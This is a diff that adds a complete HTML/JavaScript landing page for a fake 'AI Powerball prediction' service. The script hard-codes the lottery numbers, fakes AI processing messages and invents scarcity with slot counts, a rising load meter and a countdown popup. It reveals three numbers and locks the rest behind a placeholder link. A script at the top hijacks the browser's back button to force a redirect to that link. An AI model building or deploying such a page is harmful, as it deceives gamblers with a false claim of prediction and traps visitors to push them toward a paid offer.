@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Powerball — Live Draw Countdown</title>
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a000f;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
+.logo{font-size:30px;font-weight:900;color:#dc143c;letter-spacing:3px;text-align:center;margin:16px 0 4px}
+.logo span{color:#fff}
+.tagline{font-size:11px;letter-spacing:4px;color:#555;text-align:center;margin-bottom:20px}
+.live-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(220,20,60,0.15);border:1px solid rgba(220,20,60,0.4);border-radius:50px;padding:6px 16px;font-size:12px;color:#dc143c;font-weight:700;letter-spacing:2px;margin-bottom:20px}
+.live-dot{width:8px;height:8px;border-radius:50%;background:#dc143c;animation:blink 1s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
+.card{background:linear-gradient(145deg,#110018,#0a000f);border:1px solid #2a0040;border-radius:16px;padding:24px;width:100%;max-width:440px}
+.countdown-section{text-align:center;margin-bottom:24px;padding:20px;background:rgba(220,20,60,0.05);border:1px solid rgba(220,20,60,0.15);border-radius:12px}
+.countdown-label{font-size:11px;letter-spacing:4px;color:#dc143c;text-transform:uppercase;margin-bottom:12px}
+.countdown-row{display:flex;justify-content:center;gap:8px;margin-bottom:8px}
+.countdown-unit{text-align:center;min-width:60px}
+.countdown-unit .cu-num{font-size:36px;font-weight:900;color:#fff;line-height:1;display:block;background:#1a0028;border:1px solid #3a0050;border-radius:8px;padding:8px 12px}
+.countdown-unit .cu-lbl{font-size:10px;color:#555;text-transform:uppercase;letter-spacing:2px;margin-top:4px;display:block}
+.colon{font-size:32px;font-weight:900;color:#3a0050;align-self:center;margin-top:-12px}
+.draw-info{font-size:13px;color:#555;text-align:center;margin-top:8px}
+.draw-info strong{color:#c088ff}
+.jackpot-display{text-align:center;margin-bottom:20px}
+.jackpot-display .jlbl{font-size:11px;letter-spacing:4px;color:#c088ff;text-transform:uppercase;margin-bottom:6px}
+.jackpot-display .jamt{font-size:36px;font-weight:900;color:#fff}
+.jackpot-display .jcash{font-size:13px;color:#555;margin-top:2px}
+.urgency-bar{background:rgba(220,20,60,0.1);border:1px solid rgba(220,20,60,0.2);border-radius:8px;padding:12px 16px;margin-bottom:20px;text-align:center}
+.urgency-bar p{font-size:13px;color:#dc143c;font-weight:700;margin-bottom:4px}
+.urgency-bar .ub-sub{font-size:12px;color:#555;font-weight:400}
+.slots-left{display:flex;gap:4px;justify-content:center;margin-bottom:20px}
+.slot-indicator{width:24px;height:8px;border-radius:4px;background:#2a0040}
+.slot-indicator.taken{background:#dc143c}
+.ai-access{text-align:center;margin-bottom:16px}
+.ai-access h3{font-size:16px;color:#fff;margin-bottom:4px}
+.ai-access p{font-size:13px;color:#555;margin-bottom:12px}
+.access-meter{background:#1a0028;border-radius:8px;height:10px;overflow:hidden;margin-bottom:8px;position:relative}
+.access-fill{height:100%;background:linear-gradient(90deg,#c088ff,#dc143c);border-radius:8px;transition:width 0.5s}
+.access-label{display:flex;justify-content:space-between;font-size:11px;color:#555}
+.predict-btn{display:block;width:100%;padding:16px;font-size:16px;font-weight:800;border:none;border-radius:10px;cursor:pointer;letter-spacing:1px;text-transform:uppercase;margin-bottom:10px;transition:all 0.3s}
+.predict-btn.available{background:linear-gradient(135deg,#c088ff,#9955ff);color:#fff;box-shadow:0 4px 20px rgba(192,136,255,0.3)}
+.predict-btn.available:hover{transform:translateY(-2px);box-shadow:0 6px 28px rgba(192,136,255,0.5)}
+.predict-btn.disabled{background:#1a0028;color:#444;cursor:not-allowed}
+.secure-txt{text-align:center;font-size:11px;color:#444}
+.result-balls{display:flex;gap:8px;justify-content:center;margin:16px 0}
+.r-ball{width:50px;height:50px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:17px;font-weight:900;flex-shrink:0;transition:all 0.5s}
+.r-ball.hidden{background:#1a0028;border:2px dashed #2a0040;color:#333}
+.r-ball.show{background:radial-gradient(circle at 40% 35%,#fff,#bbb);color:#111;animation:pop 0.5s ease-out}
+.r-ball.locked{background:#1a0028;border:2px dashed #3a0050;color:#333;font-size:12px}
+.r-ball.pb{background:radial-gradient(circle at 40% 35%,#ff6666,#dc143c);color:#fff}
+@keyframes pop{0%{transform:scale(0);opacity:0}70%{transform:scale(1.15)}100%{transform:scale(1);opacity:1}}
+.status-txt{text-align:center;font-size:13px;color:#555;margin-bottom:10px;min-height:18px}
+.loading-bar{background:#1a0028;border-radius:8px;height:6px;overflow:hidden;margin-bottom:16px;display:none}
+.loading-fill{height:100%;background:linear-gradient(90deg,#c088ff,#9955ff);border-radius:8px;width:0%;transition:width 0.1s}
+.popup-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);display:none;justify-content:center;align-items:center;z-index:1000;padding:20px}
+.popup{background:#0a000f;border:2px solid #c088ff;border-radius:16px;padding:32px 24px;max-width:420px;width:100%;text-align:center;max-height:90vh;overflow-y:auto}
+.popup h2{font-size:20px;font-weight:900;color:#ffd700;margin-bottom:12px}
+.popup p{font-size:14px;color:#aaa;line-height:1.6;margin-bottom:12px}
+.popup .cta{display:block;background:linear-gradient(135deg,#dc143c,#ff4444);color:#fff;padding:16px 24px;border-radius:8px;font-size:15px;font-weight:800;text-decoration:none;margin:20px 0;letter-spacing:1px}
+.popup .warning{font-size:12px;color:#dc143c;font-weight:700;padding:10px;border-radius:6px;border:1px solid rgba(220,20,60,0.3);background:rgba(220,20,60,0.1)}
+.popup .timer{font-size:28px;font-weight:900;color:#dc143c;margin:8px 0}
+.unlock-btn{display:block;width:100%;padding:15px;background:linear-gradient(135deg,#dc143c,#ff4444);color:#fff;font-size:15px;font-weight:800;border:none;border-radius:10px;cursor:pointer;letter-spacing:1px;text-transform:uppercase;margin-top:10px}
+</style>
+</head>
+<body>
+
+<script>
+const link='SEU_LINK_AQUI';
+function setBackRedirect(url){let u=url.trim()+(url.indexOf('?')>0?'&':'?')+document.location.search.replace('?','').toString();history.pushState({}, '',location.href);history.pushState({}, '',location.href);history.pushState({}, '',location.href);window.addEventListener('popstate',()=>{setTimeout(()=>{location.href=u},1)})}
+setBackRedirect(link);
+</script>
+
+<div class="logo">POWER<span>BALL</span></div>
+<div class="tagline">LIVE DRAW WINDOW</div>
+<div style="text-align:center"><div class="live-badge"><div class="live-dot"></div>LIVE · AI ACCESS OPEN</div></div>
+
+<div class="card">
+  <div class="countdown-section">
+    <div class="countdown-label">⏱ Time Until Next Draw</div>
+    <div class="countdown-row">
+      <div class="countdown-unit"><span class="cu-num" id="cdDays">00</span><span class="cu-lbl">Days</span></div>
+      <span class="colon">:</span>
+      <div class="countdown-unit"><span class="cu-num" id="cdHours">00</span><span class="cu-lbl">Hours</span></div>
+      <span class="colon">:</span>
+      <div class="countdown-unit"><span class="cu-num" id="cdMins">00</span><span class="cu-lbl">Mins</span></div>
+      <span class="colon">:</span>
+      <div class="countdown-unit"><span class="cu-num" id="cdSecs">00</span><span class="cu-lbl">Secs</span></div>
+    </div>
+    <div class="draw-info">Next drawing: <strong id="drawDateTxt">Saturday, Nov 2</strong> at 10:59 PM ET</div>
+  </div>
+
+  <div class="jackpot-display">
+    <div class="jlbl">Estimated Jackpot</div>
+    <div class="jamt">$820 Million</div>
+    <div class="jcash">Cash Value: $392.8 Million</div>
+  </div>
+
+  <div class="urgency-bar">
+    <p>🔓 AI Prediction Access is OPEN right now</p>
+    <div class="ub-sub">Access closes automatically when the draw window locks</div>
+  </div>
+
+  <div style="margin-bottom:16px">
+    <div style="font-size:11px;color:#555;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px;text-align:center">Available AI prediction slots</div>
+    <div class="slots-left" id="slotsRow"></div>
+    <div style="font-size:12px;color:#c088ff;text-align:center;margin-top:4px" id="slotsLeft">7 slots remaining this draw</div>
+  </div>
+
+  <div class="ai-access">
+    <h3>🤖 AI Prediction Engine</h3>
+    <p>Generate your AI-optimized numbers before the draw window closes</p>
+    <div class="access-meter"><div class="access-fill" id="accessFill" style="width:72%"></div></div>
+    <div class="access-label"><span>AI load: 72% capacity</span><span style="color:#dc143c">Access closing soon</span></div>
+  </div>
+
+  <div class="loading-bar" id="loadingBar"><div class="loading-fill" id="loadingFill"></div></div>
+  <div class="result-balls" id="resultBalls" style="display:none">
+    <div class="r-ball hidden" id="rb0">?</div>
+    <div class="r-ball hidden" id="rb1">?</div>
+    <div class="r-ball hidden" id="rb2">?</div>
+    <div class="r-ball locked">🔒</div>
+    <div class="r-ball locked">🔒</div>
+    <div class="r-ball locked pb">🔒</div>
+  </div>
+  <div class="status-txt" id="statusTxt"></div>
+
+  <button class="predict-btn available" id="mainBtn" onclick="handleClick()">⚡ Generate My Numbers Now</button>
+  <button class="unlock-btn" id="unlockBtn" onclick="showPopup()" style="display:none">🔓 Unlock My Remaining 3 Numbers</button>
+  <div class="secure-txt">🔒 Secure · Free for this draw only · Resets after each lottery</div>
+</div>
+
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup">
+    <h2>⚡ DRAW WINDOW IS CLOSING!</h2>
+    <p>Your first 3 numbers are locked in. You have <strong style="color:#ffd700">limited time</strong> to claim the complete 6-number prediction before this draw window closes.</p>
+    <p>Watch the short activation video now — before the AI access window shuts down automatically.</p>
+    <a href="SEU_LINK_AQUI" class="cta">⚡ Claim My Complete Numbers →</a>
+    <div class="warning">⚠️ AI access window expires when the draw locks:</div>
+    <div class="timer" id="popTimer">05:00</div>
+    <p style="font-size:11px;color:#444">Prediction resets after each official Powerball draw</p>
+  </div>
+</div>
+
+<script>
+const finalNums=[33,17,58,45,62,13];
+let stage=1;
+let countdownInt=null;
+let timerInt=null;
+let accessInt=null;
+let aiLoad=72;
+
+function getNextDraw(){
+  const drawDays=[1,3,6];
+  const now=new Date();
+  let d=new Date(now);
+  for(let i=0;i<8;i++){
+    d.setDate(d.getDate()+1);
+    if(drawDays.includes(d.getDay())){
+      d.setHours(22,59,0,0);
+      return d;
+    }
+  }
+  return d;
+}
+
+function updateCountdown(){
+  const now=new Date();
+  const target=getNextDraw();
+  let diff=Math.max(0,Math.floor((target-now)/1000));
+
+  const days=Math.floor(diff/86400);diff%=86400;
+  const hours=Math.floor(diff/3600);diff%=3600;
+  const mins=Math.floor(diff/60);
+  const secs=diff%60;
+
+  document.getElementById('cdDays').textContent=days.toString().padStart(2,'0');
+  document.getElementById('cdHours').textContent=hours.toString().padStart(2,'0');
+  document.getElementById('cdMins').textContent=mins.toString().padStart(2,'0');
+  document.getElementById('cdSecs').textContent=secs.toString().padStart(2,'0');
+
+  const days2=['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+  const months=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+  document.getElementById('drawDateTxt').textContent=days2[target.getDay()]+', '+months[target.getMonth()]+' '+target.getDate();
+}
+
+function buildSlots(){
+  const row=document.getElementById('slotsRow');
+  const total=20;const taken=13;
+  for(let i=0;i<total;i++){
+    const s=document.createElement('div');
+    s.className='slot-indicator'+(i<taken?' taken':'');
+    row.appendChild(s);
+  }
+  document.getElementById('slotsLeft').textContent=(total-taken)+' slots remaining this draw';
+}
+
+function animateLoad(){
+  accessInt=setInterval(()=>{
+    aiLoad=Math.min(aiLoad+0.1,98);
+    document.getElementById('accessFill').style.width=aiLoad+'%';
+  },500);
+}
+
+function handleClick(){
+  if(stage===2){showPopup();return}
+  document.getElementById('mainBtn').disabled=true;
+  document.getElementById('mainBtn').classList.remove('available');
+  document.getElementById('mainBtn').classList.add('disabled');
+  document.getElementById('statusTxt').textContent='⚡ Accessing AI prediction engine...';
+
+  const bar=document.getElementById('loadingBar');
+  const fill=document.getElementById('loadingFill');
+  bar.style.display='block';
+
+  const msgs=[
+    '⚡ Accessing AI prediction engine...',
+    '🔐 Verifying draw window access...',
+    '🤖 Generating optimized sequence...',
+    '✅ Numbers locked before draw window closes!',
+  ];
+  let prog=0;let msgIdx=0;
+  const iv=setInterval(()=>{
+    prog+=2;
+    fill.style.width=prog+'%';
+    if(prog>30&&msgIdx===0){msgIdx=1;document.getElementById('statusTxt').textContent=msgs[1]}
+    if(prog>60&&msgIdx===1){msgIdx=2;document.getElementById('statusTxt').textContent=msgs[2]}
+    if(prog>85&&msgIdx===2){msgIdx=3;document.getElementById('statusTxt').textContent=msgs[3]}
+    if(prog>=100){
+      clearInterval(iv);
+      bar.style.display='none';
+      document.getElementById('resultBalls').style.display='flex';
+      revealBalls();
+    }
+  },40);
+}
+
+function revealBalls(){
+  for(let i=0;i<3;i++){
+    setTimeout(()=>{
+      const rb=document.getElementById('rb'+i);
+      rb.textContent=finalNums[i];
+      rb.classList.remove('hidden');
+      rb.classList.add('show');
+      const rect=rb.getBoundingClientRect();
+      confetti({particleCount:30,spread:40,origin:{x:(rect.left+25)/window.innerWidth,y:(rect.top+25)/window.innerHeight},colors:['#c088ff','#ffd700','#fff']});
+    },i*500);
+  }
+  setTimeout(()=>{
+    document.getElementById('statusTxt').textContent='✅ 3 numbers locked in! Unlock the final 3 before time runs out →';
+    document.getElementById('unlockBtn').style.display='block';
+    document.getElementById('mainBtn').style.display='none';
+    stage=2;
+  },1800);
+}
+
+function showPopup(){
+  document.getElementById('popupOverlay').style.display='flex';
+  let t=300;const el=document.getElementById('popTimer');
+  timerInt=setInterval(()=>{
+    const m=Math.floor(t/60);const s=t%60;
+    el.textContent=m.toString().padStart(2,'0')+':'+s.toString().padStart(2,'0');
+    if(t>0)t--;else clearInterval(timerInt);
+  },1000);
+}
+
+window.addEventListener('DOMContentLoaded',()=>{
+  updateCountdown();
+  countdownInt=setInterval(updateCountdown,1000);
+  buildSlots();
+  animateLoad();
+});
+</script>
+</body>
+</html>
